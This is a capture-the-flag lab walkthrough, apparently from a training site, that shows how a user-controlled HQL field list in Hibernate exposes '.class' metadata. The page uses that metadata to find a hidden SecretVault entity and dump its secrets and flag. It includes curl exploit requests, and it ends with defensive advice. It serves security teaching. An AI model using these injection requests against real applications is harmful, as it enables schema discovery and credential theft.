<h4>Overview</h4>
<p>
    In Hibernate, every entity inherits <code>.class</code> from <code>java.lang.Object</code>.
    When the SELECT field list is user-controlled, accessing <code>class.name</code>,
    <code>class.package</code>, <code>class.declaredFields</code>, and <code>class.annotations</code>
    reveals Java class names, package structures, field declarations, and table mappings --
    leading to full entity discovery and data extraction.
</p>

<h4>Step 1: Normal User Query</h4>
<p>Query the <code>User</code> entity with standard fields to see baseline behavior.</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Query User Data</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Entity: </span>User<br>
        <span class="prompt">Fields: </span>id, username, email<br>
        <span class="prompt">HQL: </span>SELECT id, username, email FROM User<br>
        <span class="prompt">Result: </span>6 rows returned<br><br>
        | id | username    | email              |<br>
        |----|-------------|--------------------|<br>
        | 1  | john_doe    | john@example.com   |<br>
        | 2  | jane_smith  | jane@example.com   |<br>
        | 3  | bob_admin   | bob@example.com    |<br>
        | 4  | alice_mod   | alice@example.com  |<br>
        | 5  | charlie_dev | charlie@example.com|<br>
        | 6  | diana_ops   | diana@example.com  |
    </div>
</div>

<h4>Step 2: Access .class Metadata</h4>
<p>
    Use <code>class.name</code> in the fields parameter to reveal the fully qualified
    Java class name. This exposes the package structure.
</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Class Name Disclosure</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Fields: </span>class.name<br>
        <span class="prompt">Result: </span><strong>com.sqliarena.hql.entity.User</strong>
    </div>
</div>

<h4>Step 3: Explore Package, Fields, and Annotations</h4>
<p>Use additional <code>.class</code> sub-properties to enumerate the entity's structure.</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. Deeper Metadata</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Fields: </span>class.package<br>
        <span class="prompt">Result: </span><strong>com.sqliarena.hql.entity</strong><br><br>
        <span class="prompt">Fields: </span>class.declaredFields<br>
        <span class="prompt">Result: </span>[{name: "id", type: "Long"}, {name: "username", type: "String"}, {name: "email", type: "String"}, {name: "<strong>role</strong>", type: "String"}]<br><br>
        <span class="prompt">Fields: </span>class.annotations<br>
        <span class="prompt">Result: </span>@Entity, @Table(name="users")
    </div>
</div>
<p>
    The <code>class.declaredFields</code> reveals a hidden field <code>role</code> not shown
    in the default UI. Querying with <code>fields=id,username,role</code> shows user roles
    including admin, moderator, developer, and operator.
</p>

<h4>Step 4: Discover Hidden Entity</h4>
<p>
    Knowing the package is <code>com.sqliarena.hql.entity</code>, try common entity names.
    Testing <code>SecretVault</code>: it exists! Use <code>class.declaredFields</code> to discover its fields.
</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. Entity Discovery</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Entity: </span>SecretVault<br>
        <span class="prompt">Fields: </span>class.declaredFields<br>
        <span class="prompt">Result: </span>[{name: "id", type: "Long"}, {name: "<strong>vaultKey</strong>", type: "String"}, {name: "<strong>vaultValue</strong>", type: "String"}]
    </div>
</div>

<h4>Step 5: Query SecretVault for the Flag</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. Access SecretVault</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Entity: </span>SecretVault<br>
        <span class="prompt">Fields: </span>id, vaultKey, vaultValue<br>
        <span class="prompt">HQL: </span>SELECT id, vaultKey, vaultValue FROM SecretVault<br>
        <span class="prompt">Result: </span>5 rows returned<br><br>
        | id | vaultKey       | vaultValue                           |<br>
        |----|----------------|--------------------------------------|<br>
        | 1  | api_key        | sk-live-a1b2c3d4e5f6g7h8i9j0         |<br>
        | 2  | db_password    | S3cur3P@ssw0rd!2026                  |<br>
        | 3  | master_flag    | <strong>FLAG{hq_cl4ss_m3t4d4t4}</strong> |<br>
        | 4  | encryption_key | aes-256-cbc:DEADBEEF0123456789       |<br>
        | 5  | jwt_secret     | super-secret-jwt-signing-key-2026    |
    </div>
</div>

<h4>Step 6: Submit the Flag</h4>
<p>
    Copy the flag from row 3 (vaultKey=master_flag): <code>FLAG{hq_cl4ss_m3t4d4t4}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Step 1: </span>curl -s "http://target/SQLi-Arena/hql/lab2" -d "entity=User&fields=class.name"<br>
        <span class="prompt">// Reveals: com.sqliarena.hql.entity.User</span><br><br>
        <span class="prompt">Step 2: </span>curl -s "http://target/SQLi-Arena/hql/lab2" -d "entity=User&fields=class.declaredFields"<br>
        <span class="prompt">// Reveals hidden fields: id, username, email, role</span><br><br>
        <span class="prompt">Step 3: </span>curl -s "http://target/SQLi-Arena/hql/lab2" -d "entity=SecretVault&fields=class.declaredFields"<br>
        <span class="prompt">// Reveals fields: id, vaultKey, vaultValue</span><br><br>
        <span class="prompt">Step 4: </span>curl -s "http://target/SQLi-Arena/hql/lab2" -d "entity=SecretVault" \<br> --data-urlencode "fields=id, vaultKey, vaultValue"<br>
        <span class="prompt">// Returns SecretVault data including FLAG</span>
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> Hibernate's <code>.class</code> property is inherited from
    <code>java.lang.Object</code> and is accessible in HQL SELECT clauses. It exposes:
    (1) <code>class.name</code>: fully qualified Java class names,
    (2) <code>class.package</code>: package structure,
    (3) <code>class.declaredFields</code>: hidden field names and types,
    (4) <code>class.annotations</code>: JPA annotations including table names.
    This enables complete application mapping. Defense: block <code>.class</code> access in query
    field selection, use DTO projections instead of raw entity queries, and validate field names
    against an allowlist.
</div>
